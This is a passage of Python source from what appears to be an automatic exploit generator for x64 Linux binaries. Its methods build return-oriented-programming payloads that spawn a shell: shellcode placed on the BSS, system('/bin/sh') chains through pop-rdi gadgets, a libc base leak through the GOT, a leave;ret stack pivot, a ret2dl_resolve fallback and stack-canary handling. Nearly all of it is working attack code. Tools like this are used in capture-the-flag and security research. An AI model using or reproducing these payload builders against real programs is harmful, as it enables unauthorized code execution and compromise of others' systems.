            self.OptimizeForROP(payload=final_payload_canary, adjustcanary=True)
            singlepayload = SinglePayload(
                content=final_payload, length=self.needlength,
                prefixlength=self.prefixlength, needline=self.needline,
                avoidchars=self.avoidchars
            )
            singlepayload_load = SinglePayload(
                content=final_payload, length=0,
                prefixlength=0, needline=False,
                avoidchars=b""
            )
            singlepayload_canary = SinglePayload(
                content=final_payload_canary, length=self.needlength,
                prefixlength=self.prefixlength + self.canary_offset_rbp, needline=self.needline,
                avoidchars=self.avoidchars
            )
            singlepayload_canary_load = SinglePayload(
                content=final_payload_canary, length=0,
                prefixlength=self.canary_offset_rbp, needline=False,
                avoidchars=b""
            )
            if not self.HandleFinalPayload(
                    singlepayload=singlepayload,
                    singlepayload_load=singlepayload_load,
                    singlepayload_canary=singlepayload_canary,
                    singlepayload_canary_load=singlepayload_canary_load,
                    haverecvlibc=False,
                    issystemroppayload=False  # syscall is not system rop
            ):
                log.info("cannot generate payload in ROPPayloadStaticNXEnable_X64")
                return False
            payload2 = [PayloadElement(
                datavalue=binsh_string, adjustinfo=None, datatype="bytes")]
            self.payloadlist.AppendPayload(SinglePayload(
                content=payload2, length=len(binsh_string),
                prefixlength=0
            ))
            return True

    def ROPPayloadDynamicNXDisable_X64(self):
        """
        no NX enabled, jmp esp and to shellcode
        :return: None
        """
        # if there is jmp rsp gadget in this binary,
        # we can just use the ROPPayloadStaticNXDisable to find a payload
        method1 = self.JmpRspPayloadGenerate()
        if method1:
            return True
        method2 = self.LoadShellcodeAndReturn()
        if method2:
            return True
        bss_address = self.GetBssAddressWrite(for_rop=False)
        shellcode_address = bss_address
        shellcode_address_element = PayloadElement(
            datavalue=shellcode_address, adjustinfo="elf_base", datatype="int64"
        )
        shellcode = self.GenerateShellcode()
        final_payload, next_avoidchars, next_needline = self.InputROPPayloadGenertate(
            address_element=shellcode_address_element,
            length=len(shellcode),
            return_element=shellcode_address_element,
            need_pop=False
        )
        self.AvoidUbuntuVersionError(final_payload)
        final_payload_canary = final_payload[:]
        self.OptimizeForROP(payload=final_payload, adjustcanary=False)
        self.OptimizeForROP(payload=final_payload_canary, adjustcanary=True)
        singlepayload = SinglePayload(
            content=final_payload, length=self.needlength,
            prefixlength=self.prefixlength, needline=self.needline,
            avoidchars=self.avoidchars
        )
        singlepayload_load = SinglePayload(
            content=final_payload, length=0,
            prefixlength=0, needline=False,
            avoidchars=b""
        )
        singlepayload_canary = SinglePayload(
            content=final_payload_canary, length=self.needlength,
            prefixlength=self.prefixlength + self.canary_offset_rbp, needline=self.needline,
            avoidchars=self.avoidchars
        )
        singlepayload_canary_load = SinglePayload(
            content=final_payload_canary, length=0,
            prefixlength=self.canary_offset_rbp, needline=False,
            avoidchars=b""
        )
        if not self.HandleFinalPayload(
                singlepayload=singlepayload,
                singlepayload_load=singlepayload_load,
                singlepayload_canary=singlepayload_canary,
                singlepayload_canary_load=singlepayload_canary_load,
                haverecvlibc=False,
                issystemroppayload=False  # input rop for shellcode
        ):
            log.info("cannot successfully generate payload in ROPPayloadDynamicNXDisable_X86")
            return False
        # self.payloadlist.AppendPayload(singlepayload)
        final_payload2 = [PayloadElement(
            datavalue=shellcode, adjustinfo=None, datatype="bytes")]
        self.payloadlist.AppendPayload(SinglePayload(
            content=final_payload2, length=len(shellcode),
            prefixlength=0, avoidchars=next_avoidchars,
            needline=next_needline
        ))
        return True

    def DynamicNXEnableHaveSystem_x64(self):
        """
        NX enabled, use ROP to solve the problem, and have system
        but no binsh
        :return: True when successfully generated, False when not
        """
        log.info("have system but no binsh, find the rdi and ROP it")
        system = self.elf.symbols["system"]
        system_element = PayloadElement(
            datavalue=system, adjustinfo="elf_base", datatype="int64")
        bss_address = self.GetBssAddressWrite(for_rop=False)
        bss_address_element = PayloadElement(
            datavalue=bss_address, adjustinfo="elf_base", datatype="int64")
        bss_address_element2 = PayloadElement(
            datavalue=bss_address, adjustinfo="elf_base", datatype="int64")
        binsh_string = b"/bin/sh\x00"
        final_payload, next_avoidchars, next_needline = self.InputROPPayloadGenertate(
            address_element=bss_address_element,
            length=len(binsh_string),
            return_element=PayloadElement(),
            need_pop=True

        )
        rdi_gadget = self.gadgetservice.FindPopGadget(register="rdi")
        rdi_value = bss_address_element2
        # final_payload = []
        final_payload.extend(self.RegisterGadgetGenerate(
            gadget=rdi_gadget, register="rdi",
            register_value=rdi_value
        ))
        final_payload.append(system_element)
        self.AvoidUbuntuVersionError(final_payload, adjust=True)
        final_payload_canary = final_payload[:]
        self.OptimizeForROP(payload=final_payload, adjustcanary=False)
        self.OptimizeForROP(payload=final_payload_canary, adjustcanary=True)
        singlepayload = SinglePayload(
            content=final_payload, length=self.needlength,
            prefixlength=self.prefixlength, needline=self.needline,
            avoidchars=self.avoidchars
        )
        singlepayload_load = SinglePayload(
            content=final_payload, length=0,
            prefixlength=0, needline=False,
            avoidchars=b""
        )
        singlepayload_canary = SinglePayload(
            content=final_payload_canary, length=self.needlength,
            prefixlength=self.prefixlength + self.canary_offset_rbp, needline=self.needline,
            avoidchars=self.avoidchars
        )
        singlepayload_canary_load = SinglePayload(
            content=final_payload_canary, length=0,
            prefixlength=self.canary_offset_rbp, needline=False,
            avoidchars=b""
        )
        if not self.HandleFinalPayload(
                singlepayload=singlepayload,
                singlepayload_load=singlepayload_load,
                singlepayload_canary=singlepayload_canary,
                singlepayload_canary_load=singlepayload_canary_load,
                haverecvlibc=False,
                issystemroppayload=True  # system payload
        ):
            log.info("cannot successfully generate payload in DynamicNXEnableHaveSystem_x64")
            return False
        final_payload2 = [PayloadElement(
            datavalue=binsh_string, adjustinfo=None, datatype="bytes")]
        self.payloadlist.AppendPayload(SinglePayload(
            content=final_payload2, length=len(binsh_string),
            prefixlength=0, avoidchars=next_avoidchars,
            needline=next_needline
        ))
        return True

    def DynamicNXEnableNoSystem_x64(self):
        """
        NX enabled, use ROP to solve the problem, and no system
        :return: True when successfully generated, False when not
        """
        final_payload = []
        leak_payload = self.GenerateLeakPayload(
            leak_address=self.elf.got["__libc_start_main"],
            adjustinfo="elf_base"
        )
        if leak_payload is not None:
            final_payload.extend(leak_payload)
        else:
            # log.Exception("leak payload generate error, please check it")
            log.info("leak payload generate error, use ret2dl_resolve")
            return self.Generate_dlruntime_resolve_Payload()
        bss_address = self.GetBssAddressWrite(for_rop=True)
        bss_address_element = PayloadElement(
            datavalue=bss_address, adjustinfo="elf_base", datatype="int64")
        input_payload, next_avoidchars, next_needline = self.InputROPPayloadGenertate(
            address_element=bss_address_element,
            length=0x8 * 3,
            return_element=PayloadElement(),
            need_pop=True
        )
        if input_payload is None:
            log.Exception("cannot successfully genertate payload in DynamicNXEnableNoSystem_x64")
            return False
        final_payload.extend(input_payload)
        rbp_gadget = self.gadgetservice.FindPopGadget(register="rbp")
        bss_address_minus8_element = PayloadElement(
            datavalue=bss_address - 0x8, adjustinfo="elf_base",
            datatype="int64")
        final_payload.extend(self.RegisterGadgetGenerate(
            gadget=rbp_gadget, register="rbp",
            register_value=bss_address_minus8_element
        ))
        leave_ret_gadget = self.gadgetservice.FindInstructionGadget(instruction="leave;ret")
        final_payload.append(PayloadElement(
            datavalue=leave_ret_gadget.address, adjustinfo="elf_base", datatype="int64"
        ))
        self.AvoidUbuntuVersionError(payload=final_payload)
        final_payload_canary = final_payload[:]
        self.OptimizeForROP(payload=final_payload, adjustcanary=False)
        self.OptimizeForROP(payload=final_payload_canary, adjustcanary=True)
        singlepayload = SinglePayload(
            content=final_payload, length=self.needlength,
            prefixlength=self.prefixlength, needline=self.needline,
            avoidchars=self.avoidchars
        )
        singlepayload_load = SinglePayload(
            content=final_payload, length=0,
            prefixlength=0, needline=False,
            avoidchars=b""
        )
        singlepayload_canary = SinglePayload(
            content=final_payload_canary, length=self.needlength,
            prefixlength=self.prefixlength + self.canary_offset_rbp, needline=self.needline,
            avoidchars=self.avoidchars
        )
        singlepayload_canary_load = SinglePayload(
            content=final_payload_canary, length=0,
            prefixlength=self.canary_offset_rbp, needline=False,
            avoidchars=b""
        )
        if not self.HandleFinalPayload(
                singlepayload=singlepayload,
                singlepayload_load=singlepayload_load,
                singlepayload_canary=singlepayload_canary,
                singlepayload_canary_load=singlepayload_canary_load,
                haverecvlibc=True,
                issystemroppayload=True  # puts will affect this, we should avoid this
        ):
            log.info("cannot successfully generate payload in DynamicNXEnableNoSystem_x64")
            return False
        rdi_gadget = self.gadgetservice.FindPopGadget(register="rdi")
        rdi_value = PayloadElement(
            datavalue=next(self.libc.search(b"/bin/sh")),
            adjustinfo="libc_base", datatype="int64"
        )
        final_payload2 = []
        final_payload2.extend(self.RegisterGadgetGenerate(
            gadget=rdi_gadget, register="rdi",
            register_value=rdi_value
        ))
        final_payload2.append(PayloadElement(
            datavalue=self.libc.symbols["system"],
            adjustinfo="libc_base", datatype="int64"
        ))
        self.OptimizeForROP(payload=final_payload2, adjustcanary=False)
        singlepayload = SinglePayload(
            content=final_payload2, length=0x8 * 3,
            prefixlength=0, avoidchars=next_avoidchars,
            needline=next_needline
        )
        self.payloadlist.AppendPayload(singlepayload)
        return True

    def ROPPayloadDynamicNXEnable_X64(self):
        """
        NX enabled, use ROP to solve the problem
        :return: True when successfully generated, False when not
        """
        if "system" in self.elf.symbols.keys():
            log.info("find a system symbol in this binary, just use this")
            havesystem = True
            system = self.elf.symbols["system"]
            system_element = PayloadElement(
                datavalue=system, adjustinfo="elf_base", datatype="int64")
        else:
            log.info("no system in this binary, try to use ret2libc3")
            havesystem = False
            system = 0
            system_element = PayloadElement()
        try:
            log.info("find /bin/sh string in this binary")
            binsh = next(self.elf.search(b"/bin/sh"))
            binsh_element = PayloadElement(
                datavalue=binsh, adjustinfo="elf_base", datatype="int64")
            havebinsh = True
        except:
            log.info("cannot find /bin/sh string in this binary")
            binsh = 0
            binsh_element = PayloadElement()
            havebinsh = False
        if havesystem and havebinsh:
            log.info("have system and binsh, find the rdi and ROP it")
            rdi_gadget = self.gadgetservice.FindPopGadget(register="rdi")
            final_payload = []
            final_payload.extend(self.RegisterGadgetGenerate(
                gadget=rdi_gadget, register="rdi",
                register_value=binsh_element
            ))
            final_payload.append(system_element)
            #self.AvoidUbuntuVersionError(final_payload)
            final_payload_canary = final_payload[:]
            self.AvoidUbuntuVersionError(final_payload_canary)
            self.OptimizeForROP(payload=final_payload, adjustcanary=False)
            self.OptimizeForROP(payload=final_payload_canary, adjustcanary=True)
            singlepayload = SinglePayload(
                content=final_payload, length=self.needlength,
                prefixlength=self.prefixlength, needline=self.needline,
                avoidchars=self.avoidchars
            )
            singlepayload_load = SinglePayload(
                content=final_payload, length=0,
                prefixlength=0, needline=False,
                avoidchars=b""
            )
            singlepayload_canary = SinglePayload(
                content=final_payload_canary, length=self.needlength,
                prefixlength=self.prefixlength + self.canary_offset_rbp, needline=self.needline,
                avoidchars=self.avoidchars
            )
            singlepayload_canary_load = SinglePayload(
                content=final_payload_canary, length=0,
                prefixlength=self.canary_offset_rbp, needline=False,
                avoidchars=b""
            )
            if not self.HandleFinalPayload(
                    singlepayload=singlepayload,
                    singlepayload_load=singlepayload_load,
                    singlepayload_canary=singlepayload_canary,
                    singlepayload_canary_load=singlepayload_canary_load,
                    haverecvlibc=False,
                    issystemroppayload=True  # system("/bin/sh") payload
            ):
                log.info("cannot successfully generate payload in ROPPayloadDynamicNXEnable_X64")
                return False
            return True
        if havesystem and not havebinsh:
            return self.DynamicNXEnableHaveSystem_x64()
        if not havesystem:
            log.info("no system, must use leak info to leak libc base and ROP")
            return self.DynamicNXEnableNoSystem_x64()
        return False